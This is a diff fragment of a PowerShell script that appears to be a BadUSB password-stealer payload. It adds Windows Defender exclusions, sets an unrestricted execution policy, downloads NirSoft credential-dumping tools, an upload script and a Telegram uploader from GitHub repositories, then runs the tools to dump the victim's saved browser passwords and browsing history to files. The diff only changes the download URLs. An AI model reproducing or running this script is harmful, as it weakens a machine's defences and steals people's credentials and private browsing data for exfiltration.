@@ -4,10 +4,10 @@ Add-MpPreference -ExclusionExtension ps1 -Force
 Set-ExecutionPolicy unrestricted -Force
 New-Item -Path "C:\Users\Public\Documents\dump" -ItemType Directory
 Invoke-WebRequest https://raw.githubusercontent.com/idontknow-CC/gigido/main/fin_upload.ps1 -OutFile fin_upload.ps1 
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe
+Invoke-WebRequest https://github.com/idontknow-CC/test/blob/main/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe
+Invoke-WebRequest https://github.com/idontknow-CC/test/blob/main/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe
+Invoke-WebRequest https://github.com/idontknow-CC/test/blob/main/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe
+Invoke-WebRequest https://github.com/idontknow-CC/test/blob/main/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe
 Invoke-WebRequest https://github.com/idontknow-CC/gigido/raw/main/window_telegram_uploader.exe -OutFile telegram_uploader.exe
 .\WebBrowserPassView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt 
 .\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_history.txt
